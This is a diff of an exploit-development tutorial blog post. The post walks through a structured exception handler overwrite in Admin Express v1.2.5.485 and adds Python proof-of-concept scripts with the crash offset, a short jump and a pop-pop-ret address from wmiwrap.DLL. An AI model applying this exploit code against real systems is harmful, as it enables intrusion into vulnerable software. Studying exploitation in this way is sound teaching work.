@@ -52,7 +52,27 @@ Seeing as we cannot control the instruction pointer, the logical next choice wou
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/3.png" alt="">
 
-Now that we can control our exception handlers we can use the typical `pop <reg> pop <reg> ret` method to get our user supplied instructions onto the stack! We will need to use __mona__ to find an address in Admin Express that contains the instructions of `pop <reg> pop <reg> ret`. Here is the command in mona to use: 
+As I have already explained in a [previous post](https://connormcgarr.github.io/Exception-Handlers-and-Egg-Hunters/) how the exception handler exploits work, I will omit the offset to the exception handlers. I want this post to be more about alphanumeric encoding, stack alignments, and getting creative. I can tell you that the amount of bytes needed to reach the handlers is `4260`
+
+For those of you following along or are interested, your POC should be updated to this:
+
+```console
+root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
+# Proof of Concept - Admin Express v1.2.5.485 Exploit
+
+payload = "\x41" * 4260
+payload += "\x42\x42\x42\x42" 		# nSEH
+payload += "\x43\x43\x43\x43"		# SEH
+payload += "\x41" * (5000-len(payload))	# The remaining bytes to create the crash
+
+print payload
+
+#f = open('pwn.txt', 'w')
+#f.write(payload)
+#f.close()
+```
+
+we can use the typical `pop <reg> pop <reg> ret` method to get our user supplied instructions onto the stack! We will need to use __mona__ to find an address in Admin Express that contains the instructions of `pop <reg> pop <reg> ret`. Here is the command in mona to use: 
 `!mona seh`
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/4.png" alt="">
@@ -61,4 +81,25 @@ Better view of the addresses (open the above image in a new tab to see more clea
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/5a.png" alt="">
 
-As you can see, there is a problem. All of the recommended memory addresses contain `00`, or null bytes. As we will find, these are not in our allowed character set. To get around this problem, read line that says:                                       `[+] Done.. Only the first 20 pointers are show here, For more pointers, open seh.txt`. If you open __File Explorer__ and go to __`C:\Program Files\Immunity Inc\Immunity Debugger\seh.txt`__ you can find a list of all instructions that are `pop <reg> pop <reg> ret`.
+As you can see, there is a problem. All of the recommended memory addresses contain `00`, or null bytes. As we will find, these are not in our allowed character set. To get around this problem, read line that says:                                       `[+] Done.. Only the first 20 pointers are shown here, For more pointers, open seh.txt`. If you open __File Explorer__ and go to `C:\Program Files\Immunity Inc\Immunity Debugger\seh.txt` you can find a list of all instructions that are `pop <reg> pop <reg> ret`within seh.txt
+
+You can go to seh.txt choose any of the memory locations that will work. You will find out shortly that we have some bad characters, and some of them may not work. There are a few in there that have no null bytes __AND__ adhere to the character schema. We will get to finding all of the bad characters in a second, just keep [Trying Harder](https://www.offensive-security.com/when-things-get-tough/) The address I chose was: `0x10014C42`.
+
+Before updating the PoC, let's add a jump! The typical thing to do in a SEH exploit would be to do a short jump into the second buffer, where presumably our shellcode is. Here is the updated PoC:
+```console
+root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
+# Proof of Concept - Admin Express v1.2.5.485 Exploit
+
+payload = "\x41" * 4260
+payload += "\xeb\x06\x90\x90" 		# Short jump 6 bytes into C buffer
+payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
+payload += "\x43" * (5000-len(payload))	# The remaining bytes to create the crash. Changed to C's to differentiate
+					# between 1st and last buffer.
+
+print payload
+
+#f = open('pwn.txt', 'w')
+#f.write(payload)
+#f.close()
+```
+
